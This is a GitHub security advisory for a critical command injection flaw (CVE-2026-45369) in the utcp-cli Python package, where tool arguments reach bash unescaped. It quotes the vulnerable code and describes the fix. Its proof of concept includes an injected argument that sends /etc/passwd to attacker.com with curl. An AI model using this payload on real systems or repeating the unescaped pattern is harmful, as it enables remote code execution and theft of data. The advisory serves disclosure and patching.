# [C] utcp-cli Vulnerable to Command Injection via Unsanitized Argument Substitution in CLI Communication Protocol

## Summary
Severity: Critical
Advisory: GHSA-33p6-5jxp-p3x4
CVE: CVE-2026-45369
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-33p6-5jxp-p3x4
Type: github-advisory

## Affected
- PyPI: `utcp-cli` — affected >=0 <1.1.2

## Details
## Summary

The `_substitute_utcp_args` method in `cli_communication_protocol.py` inserts user-controlled `tool_args` values directly into shell command strings without any sanitization or escaping. These commands are then executed via `/bin/bash -c` (Unix) or `powershell.exe -Command` (Windows), allowing an attacker to inject arbitrary shell commands.

## Affected File

`plugins/communication_protocols/cli/src/utcp_cli/cli_communication_protocol.py`

## Vulnerable Code

```python
def replace_placeholder(match):
    arg_name = match.group(1)
    if arg_name in tool_args:
        return str(tool_args[arg_name])  # No escaping applied
```

The substituted command is then embedded directly into a shell script:

```python
script_lines.append(f'{var_name}=$({substituted_command} 2>&1)')
```

And executed via:

```python
shell_cmd = ['/bin/bash', '-c', script]
```

## Proof of Concept

Given a tool defined as:
```json
{"command": "python script.py --input UTCP_ARG_filename_UTCP_END"}
```

Calling with:
```python
tool_args = {"filename": "data.csv; curl http://attacker.com/$(cat /etc/passwd | base64)"}
```

Produces and executes:
```bash
CMD_0_OUTPUT=$(python script.py --input data.csv; curl http://attacker.com/$(cat /etc/passwd | base64) 2>&1)
```

This results in full Remote Code Execution on the host system.

## Patched

Fixed in `utcp-cli` 1.1.2. `_substitute_utcp_args` now shell-quotes every substituted value: `shlex.quote` on Unix, a PowerShell single-quoted literal on Windows. Each `UTCP_ARG_..._UTCP_END` placeholder therefore expands to exactly one shell token, blocking metacharacter injection (`;`, `|`, `&`, backticks, `$()`, newlines).

**Behavior change:** tools that relied on a single placeholder splitting into multiple shell tokens (e.g. `UTCP_ARG_flags_UTCP_END` -> `--verbose --debug`) must now use one placeholder per intended argument.

## Mitigation

Upgrade to `utcp-cli >= 1.1.2`. There is no workaround in earlier versions short of refusing all attacker-controlled `tool_args`.

## Credit

Reported by @ZeroXJacks.

## References
- https://github.com/universal-tool-calling-protocol/python-utcp/security/advisories/GHSA-33p6-5jxp-p3x4
- https://nvd.nist.gov/vuln/detail/CVE-2026-45369
- https://github.com/universal-tool-calling-protocol/python-utcp
